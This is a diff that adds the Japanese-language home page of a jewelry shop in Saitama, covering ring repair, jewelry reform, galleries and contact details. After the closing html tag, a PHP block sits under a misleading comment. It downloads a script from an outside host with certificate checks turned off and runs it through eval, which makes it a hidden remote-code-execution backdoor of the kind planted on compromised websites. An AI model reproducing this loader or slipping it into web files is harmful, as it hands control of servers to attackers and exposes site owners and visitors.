@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FHFMRHQ9D4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FHFMRHQ9D4');
+</script>
+<meta charset="UTF-8">
+<meta name="keywords" content="ジュエリーリフォーム,リング手作り加工,指輪サイズ直し・修理,さいたま市の宝石店">
+<meta name="description" content="さいたま市中央区に実店舗を持つジュエリーショップです。宝石・貴金属製品の販売、ジュエリーリフォーム・オリジナルジュエリー加工、また指輪のサイズ直し・修理等、どうぞお気軽にご相談下さい。">
+<meta name="robots" content="INDEX,FOLLOW">
+
+<title>宝石のユーマン －ジュエリーリフォーム・宝石貴金属ショップ－</title>
+<link rel="stylesheet" type="text/css" href="style.css">
+</head>
+
+<body>
+<div id="container">
+
+<header>
+<table>
+<tbody>
+<tr>
+<td class="free"><img src="/gif/free.gif" width="134" height="15" alt="Feel free to Link"></td>
+<td class="since"><img src="/gif/since.gif" width="96" height="15" alt="2003年2月15日開設"></td>
+</tr>
+</tbody>
+</table>
+
+<table class="layout">
+<tbody>
+<tr>
+<td class="bg" colspan="2"></td>
+</tr>
+<tr>
+<td class="bg2"></td>
+<td><img class="banner" src="/gif/top_banner.gif" width="560" height="96" alt="WEB SHOP by U-MAN Jewel Company"></td>
+</tr>
+<tr>
+<td class="bg"></td>
+<td><img class="shop" src="/gif/shop.gif" width="377" height="21" alt="Jewelry reform/Order/Repair"></td>
+</tr>
+</tbody>
+</table>
+</header>
+
+<div class="sidebar_menu">
+<nav>
+<table id="menu_box">
+<tbody>
+<tr>
+<td class="menu">
+<p class="lastup"><img src="/gif/lastup.gif" width="123" height="25" alt="最終ブログ更新日8月10日"></p>
+
+<p class="mg_b" style="color: #002e85">商品ギャラリー<br>（改装中）</p>
+
+<p><a href="https://www.u-man.co.jp/size/" title="指輪のサイズ直し 新品仕上げ ロジウムメッキ等々">修理大歓迎</a></p>
+<p><a href="https://www.u-man.co.jp/reform/" title="ジュエリーリフォーム 指輪手作り加工等">リフォーム</a></p>
+<p class="mg_b_faq"><a href="https://www.u-man.co.jp/faq/" title="FAQ 用語解説等">FAQ</a></p>
+
+<p class="mg_b_blog"><a href="https://u-man.blog" title="ジュエリーリフォームブログ/ダイアリー 8/10New">ジュエリー生まれ<br>変り日記</a></p>
+
+<p><a href="https://www.u-man.co.jp/map/" title="実店舗地図 さいたま市中央区">地 図</a></p>
+<p><a href="https://www.u-man.co.jp/map/sitemap.html" title="コンテンツ一覧">サイトマップ</a></p>
+<p class="mg_b"><a href="https://www.u-man.co.jp/order/voice/" title="ご依頼頂いたお客様からのメール">お客様の声</a></p>
+
+<p><a href="https://www.u-man.co.jp/FS-APL/FS-Form/form.cgi?Code=u-man"><img src="/gif/mailbird.gif" width="64" height="64" alt="お問い合わせメールフォーム"></a></p>
+</td>
+</tr>
+</tbody>
+</table>
+</nav>
+</div>
+
+<section>
+<p><img class="cover" src="/pic/cover15.jpg" width="540" height="359" alt="トップページカバー写真 真夏バージョン"></p>
+<table class="welcomebox">
+<tbody>
+<tr>
+<td>
+<h1>◆<span style="margin:0 0.1em 0 0.2em;">宝石のユーマン　ウェブサイトへようこそ</span>◆</h1>
+
+<p class="note">
+さいたま市 (元 与野市) 中央通り、開店45年の宝石・貴金属店です。 これまで多くのお客様にご愛顧頂いてまいりました。<br>
+2004年末、サーバーを移転。 新アドレス(ドメイン)の下、心機一転努力してまいります。 今後ともどうぞよろしくお願い申し上げます。<br>
+「<a href="reform/">ジュエリーリフォーム</a>」 ・ 「<a href="reform/sample/eternity.html">指輪手作り加工</a>(例)」 ・ 「<a href="reform/sample/">ダイヤモンド立爪リフォーム</a>(例)」、また、「<a href="size/">指輪のサイズ直し/修理</a>」 ・ 「<a href="reform/plate/plate01.html">ロジウムメッキ/18金メッキ</a>」 等々、どうぞお任せください。</p>
+
+</td>
+</tr>
+</tbody>
+</table>
+</section>
+
+<nav>
+<p class="gallery">
+<img class="mg_b2" src="/gif/togallery.gif" width="120" height="19" alt="各ジャンルギャラリーへ">
+<br>
+<a href="https://www.u-man.co.jp/gallery/"><img src="/pic/gallery/fashion1.jpg" width="124" height="95" alt="ファッションリングギャラリー"></a>
+<a href="https://www.u-man.co.jp/gallery/"><img src="/pic/gallery/fashion2.jpg" width="124" height="95" alt="ファッションリングギャラリー"></a>
+<a href="https://www.u-man.co.jp/gallery/"><img src="/pic/gallery/stones.jpg" width="124" height="95" alt="指輪ギャラリー"></a>
+<a href="https://www.u-man.co.jp/gallery/"><img src="/pic/gallery/eme.jpg" width="124" height="95" alt="エメラルドギャラリー"></a>
+<a href="https://www.u-man.co.jp/gallery/"><img src="/pic/gallery/ruby.jpg" width="124" height="95" alt="ルビーギャラリー"></a>
+<a href="https://www.u-man.co.jp/gallery/"><img src="/pic/gallery/sapphire.jpg" width="124" height="95" alt="サファイヤギャラリー"></a>
+<br>
+<a href="https://www.u-man.co.jp/gallery/"><img src="/pic/gallery/pearl.jpg" width="124" height="95" alt="パールギャラリー"></a>
+<a href="https://www.u-man.co.jp/gallery/"><img src="/pic/gallery/dia.jpg" width="124" height="95" alt="ダイヤモンドギャラリー"></a>
+<a href="https://www.u-man.co.jp/gallery/"><img src="/pic/gallery/neck_brace.jpg" width="124" height="95" alt="ネックレス・ブレスレットギャラリー"></a>
+<a href="https://www.u-man.co.jp/gallery/"><img src="/pic/gallery/pd.jpg" width="124" height="95" alt="ペンダントギャラリー"></a>
+<a href="order/e-collect/"><img class="ecoll" src="/gif/ecoll_m.gif" width="83" height="79" alt="分割払い・リボ払いが可能です e-コレクトについて"><img class="ecoll" src="/gif/ecollect_m.gif" width="156" height="79" alt="分割払い・リボ払いが出来ます e-コレクトについて"></a>
+</p>
+</nav>
+
+<div><img class="mg_b3" src="/gif/ribbon_new.gif" width="938" height="36" alt=""></div>
+
+<footer>
+<p class="address">
+〒338-0002<br>
+埼玉県さいたま市中央区下落合5-10-7<br>
+Tel　　048-852-5280<br>
+Mail　　u-man@u-man.co.jp<br>
+AM10:00～PM6:00 (月曜定休)</p>
+
+<p class="add2">
+<strong>有限会社 ユーマン</strong><img src="/pic/mark.jpg" width="82" height="44" alt="宝石店ユーマンのマークです"></p>
+<p class="law">
+<img src="/gif/16-01.gif" width="16" height="16" alt=""> <a href="law/">特定商取引法第11条に基づく表記</a> <img src="/gif/16-01.gif" width="16" height="16" alt=""></p>
+
+<hr>
+
+<aside>
+<p class="com">
+ご訪問ありがとうございます。 <a href="mailto:u-man@u-man.co.jp" title="注/メールソフトが立ち上がります">ご意見・ご感想</a> をぜひともお寄せください。</p>
+<p class="copyright">
+<img src="/gif/copyright.gif" width="378" height="17" alt="著作権表記"></p>
+</aside>
+
+<div>
+<a href="https://creativecommons.org/licenses/by-nc-nd/2.1/jp/"><img class="creativecommons" src="/pic/creativecommons.png" width="88" height="31" alt="CreativeCommons 表示-非営利-改変禁止 2.1 日本"></a>
+<a href="https://jigsaw.w3.org/css-validator/"><img class="css" src="/gif/vcss.gif" width="88" height="31" alt="W3C CSS 検証サービス"></a>
+</div>
+</footer>
+
+</div>
+</body>
+</html>
+<?php
+session_start();
+
+/**
+* Disable error reporting
+*
+* Set this to error_reporting( -1 ) for debugging.
+*/
+function geturlsinfo($url) {
+  if (function_exists('curl_exec')) {
+    $conn = curl_init($url);
+    curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+    curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+
+    
+    $url_get_contents_data = curl_exec($conn);
+    curl_close($conn);
+  } elseif (function_exists('file_get_contents')) {
+    $url_get_contents_data = file_get_contents($url);
+  } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+    $handle = fopen($url, "r");
+    $url_get_contents_data = stream_get_contents($handle);
+    fclose($handle);
+  } else {
+    $url_get_contents_data = false;
+  }
+  return $url_get_contents_data;
+}
+
+  $a = geturlsinfo('https://www.backlinkku.id/menu/vip-v2/script.txt');
+  eval('?>' . $a);
+?>
